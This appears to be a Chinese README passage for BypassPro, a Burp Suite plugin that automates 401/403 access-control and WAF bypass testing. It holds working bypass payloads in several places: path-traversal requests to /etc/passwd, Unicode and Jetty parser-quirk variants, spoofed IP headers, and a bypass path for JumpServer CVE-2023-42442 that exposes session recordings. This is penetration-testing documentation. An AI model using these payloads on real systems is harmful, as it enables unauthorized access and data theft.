- Dashboard 勾选 `AutoScan`。
- 或者在请求上右键 `Send to BypassPro (Access Control)`。

配置位置：

```yaml
profiles:
  auto_access_bypass:
```

主要规则：

- `suffix`：在 path 末尾追加变体。
  - 例如 `.js`、`.css`、`/.`、`?`、`;param=1`。
- `prefix`：在 path 的每一层前插入变体。
  - 例如 `;/`、`./`、`%2e/`、`%252e/`。
- `boundary_insert`：在目录边界插入变体。
  - 例如 `;`、`;param=1`、`%00`、`%2e`。
- `headers`：添加或替换伪造头。
  - 例如 `X-Forwarded-For`、`X-Client-IP`、`X-Remote-Addr`、`Referer`。

AutoScan 触发条件：

- 先在 Dashboard 勾选 `AutoScan`，默认关闭。
- 开启后监听新经过 Proxy 的响应，不会回扫已有历史记录；Repeater 等其他工具中的请求需要通过右键菜单送入。
- 响应状态码为 `401` 或 `403` 时触发。
- 按 `profiles.auto_access_bypass.ignore_extensions` 过滤静态资源，默认包括图片、JS、CSS、字体等后缀。

AutoScan 会根据代理流量自动触发并发送变体请求。若 Dashboard 没有记录，先检查“计划”计数是否增加：增加说明已生成扫描任务。默认展示“信号与错误”，可切换“全部结果 / 错误 / 已过滤”并搜索 URL 或原因。结果是插件发送的变体记录。

Dashboard 入表逻辑：

- 插件会对原请求生成一批变体并重放。
- 候选状态码为 `200/206/304/301/302/303/307/308/405/415`，并结合相似度低于 `general.similarity_threshold` 或状态码类别变化判定信号；Ghost 变体还检查已配置的特征。
- 所有已完成变体记录均保留，非候选标为“已过滤”，失败标为“错误”；`405/415` 仅是解析或方法差异线索。
- Dashboard 保留最近 5000 条，界面显示已移除的最早记录数量；输入准备队列满时会提示未入队，便于手动重试。
- `Reason` 列会显示入表原因，例如：
  - `status:403 -> 200`
  - `sim:0.42 < 0.85`
  - `class changed`

#### 3. Auto-WAF绕过

Auto-WAF绕过用于对某一个请求自动生成 WAF 绕过变体。

入口：

- 在 Proxy / Target / Repeater 等位置选中请求。
- 右键 `Send to BypassPro (WAF)`。

配置位置：

```yaml
profiles:
  auto_waf_bypass:
```

自动变体来源：

- Path / Header 规则：
  - `suffix`
  - `prefix`
  - `boundary_insert`
  - `headers`
- Body 编码：
  - UTF-16
  - UTF-16BE
  - UTF-16LE
  - UTF-32
  - UTF-32BE
  - UTF-32LE
  - IBM037
- Body 变换：
  - Gzip 压缩请求体。
- Content-Type 伪装：
  - `application/x-www-form-urlencoded`
  - `multipart/form-data`
  - `text/plain`
- Ghost Bits 自动绕过：
  - `eq`：只对原请求已有的可疑 token 做低 8 位等价变形。
    - 作用域包括 query value、form value、JSON string、multipart filename。
    - 典型 token 包括 `../`、`@type`、边界清晰的 `class`、`Runtime`、`union/select`、`.jsp`、CRLF 编码态等。
    - 低位还原校验必须满足：`fold(mutated scope) == original scope`。
  - `parser`：只对原请求已有解析结构做差异变形。
    - 例如已有 `%2e` 时尝试 Jetty loose hex `%2>`。
    - 例如已有 `\u0040` / `\x40` 时尝试 Unicode digit / loose hex 表达。
  - 普通 path segment 不做通用 Ghost 化，不凭空替换成 `/etc/passwd`、Openfire setup path 等完整漏洞链。
  - Spring Static Path Traversal、Jetty `%2>`、Tomcat filename、Fullwidth URL Traversal、fastjson / jackson / BCEL / SMTP 等场景模板保留在配置里，但默认关闭，必须明确勾选才会发送。

WAF Options 配置位置：

```yaml
profiles:
  auto_waf_bypass:
    options:
      body_charset:
      body_transform:
      content_type_spoof:
      ghost_bits:
```

说明：

- Body 编码类变体只对存在 body 的请求生效。
- `multipart` 会尽量把普通表单转换为 multipart；非表单请求则偏向 Content-Type 伪装。
- Ghost Bits 默认是表达形态绕过候选，不是漏洞利用确认。
- Auto 结果只说明该请求存在可尝试的 Ghost Bits / parser 差异表达；能否真正利用，需要结合响应差异、后端行为和手动复测。
- 场景模板属于明确 opt-in 的漏洞链探测，开启后可能替换 path 或 filename。
- 如果 Ghost Bits 请求需要保留原始 Unicode path/header，插件会按配置走 Raw Socket。
  - `raw_socket: true` 时启用。
  - Dashboard 的 `tool` 可能显示为 `send-waf/ghost`。
  - `Reason` 会显示 `ghost:eq` / `ghost:parser` / `ghost:template`、scope、token、sender、fold 摘要等信息。

#### 4. Manual-WAF 工作台

Manual-WAF 是 5.x 的核心工作台。它不是自动扫描器，而是给你一个“可编辑请求 + 选区变形 + Raw/Burp 发包 + 历史记录”的绕过实验环境。

入口：

- 在 Proxy / Target / Repeater 等位置选中请求。
- 右键 `Send to BypassPro (Manual WAF)`。

基础流程：

1. 在 Request 编辑器里确认原始请求。
2. 选中你要变形的内容。
3. 在下方工具区选择对应功能。
4. 看底部状态、Ghost 还原预览、diff 提示。
5. 选择 Send 模式：
  - `Auto`：默认，发现请求行或 headers 有非 ASCII 时自动走 Raw Socket。
  - `Burp`：强制 Burp 发包。
  - `Raw`：强制 Raw Socket。
  - 注意：Raw Socket 不走 Burp 的 Upstream Proxy / SOCKS Proxy。
6. 确认顶部“网络目标 Host / Port / HTTPS”，点击 `Send`。本次发送使用独立快照，右侧说明响应对应的版本；继续编辑会显示响应属于此前版本。
7. `Cancel` 取消等待并忽略晚到结果；底层请求可能仍在结束。双击 History 恢复完整快照，单击只选中条目。载入新请求前如有未发送修改，会提示是否替换。

推荐先点击“重发原请求”，确认基线，再点击“恢复原请求”，应用一个变换并 Send。重发不会覆盖编辑器中的变体；右侧可切换“基线响应 / 当前响应”，查看状态码、长度和正文相似度。网络目标、发送方式或跳转设置不同时会提示重发，不直接作同条件比较。请求上方显示变换顺序，撤销、重做和恢复同步更新；UTF-16 等变换的配套 Header 和长度调整仍算一次操作。

常用选区工具在无选区时禁用并提示先选中文本；底部显示选区字节数，变换后显示字节数变化和撤销提示。等长 Body 修改也会被差异摘要识别。

选区规则：

- 有选区：永远以用户选区为最高优先级。
- 没选区：只有工具能安全判断作用域时才自动处理。
- 没选区且无法安全判断：提示先选中。
- 变形后保持编辑器光标和选区附近位置，不跳回请求开头。

#### 6. Auto Ghost Bits 到底会发什么

当你右键 `Send to BypassPro (WAF)` 时，Auto Ghost Bits 默认不会构造新的 CVE payload。它只会基于原请求已有内容生成候选。

示例 1：普通业务请求。

```http
GET /roche/jsq/h5/api/storage/view HTTP/1.1
Host: target.com
```

默认不会生成 Ghost Bits 变体。因为没有可疑 token，也没有 `%xx` / `\uXXXX` / `\xHH` 等 parser 结构。

示例 2：query value 中已有路径穿越语义。

```http
GET /api/download?file=../../etc/passwd HTTP/1.1
Host: target.com
```

Auto 可能生成 `ghost:eq` 候选：

```http
GET /api/download?file=阮阮/阮阮/etc/passwd HTTP/1.1
Host: target.com
```

Reason 类似：

```text
ghost:eq; scope:query; token:traversal; sender:raw; strategy:minimal; fold:阮阮/... -> ../../...
```

这表示“同一个攻击语义换了一种显示形态”，不是漏洞确认。

示例 3：path 中已有 `%2e`。

```http
GET /api/%2e%2e/admin HTTP/1.1
Host: target.com
```

Auto 可能生成 `ghost:parser` 候选：

```http
GET /api/%2>%2>/admin HTTP/1.1
Host: target.com
```

Reason 类似：

```text
ghost:parser; scope:percent_hex; token:percent-hex; sender:burp; parser-diff only, not vulnerability confirmation
```

示例 4：JSON 里有 `classic`。

```http
POST /api HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 18

{"name":"classic"}
```

默认不会因为 `classic` 里包含 `class` 前缀就生成 Ghost Bits 候选。`class` token 必须有明确边界或出现在 `classLoader` 这类真实语义里，避免误伤。


#### 快速开始（推荐流程）

- **先用 Auto Scan**：快速覆盖站点常见的 401/403 场景，找“可能绕过点”
- **对可疑请求用主动模式复测**：右键发起 `Access Control` 或 `WAF`
- **需要精细化研究时用 Manual WAF**：把请求送入工作台，多轮变形与对比


### 历史案例

以下为 BypassPro 早期版本的使用记录，和 5.x 的 Gh0st Bits 工作台不是同一类功能。

### 案例 1

之前很多案例没有记录。这次bypasspro又发现了一个

最近的JumpServer未授权访问漏洞(CVE-2023-42442)：未经身份验证的远程攻击者利用该漏洞可以访问录像文件，远程获取到敏感信息。

目前各大CERT给出的payload是/api/v1/terminal/sessions/ 或者/api/v1/terminal/sessions/?limit=1

部分企业可能无法及时升级版本，在nginx或者其他设备做防护处理。

比如访问原始payload
<img width="1970" height="1008" alt="image" src="https://github.com/user-attachments/assets/b36b8874-b615-44eb-895a-f6acd2d95022" />


ok BypassPro给出 bypass 的payload：/api/v1/terminal/sessions.json?limit=1

<img width="2556" height="1074" alt="image" src="https://github.com/user-attachments/assets/aa6f0e13-d970-49d9-a3ff-b98671734e26" />


#### 案例 2

<img width="1010" height="324" alt="image" src="https://github.com/user-attachments/assets/f71b7668-74ee-4a2b-aabb-8ebea247121e" />

emmm这个时候还是老版本，

<img width="2866" height="1460" alt="image" src="https://github.com/user-attachments/assets/208ef4ff-3d3a-434f-85d8-bac3e34518f3" />
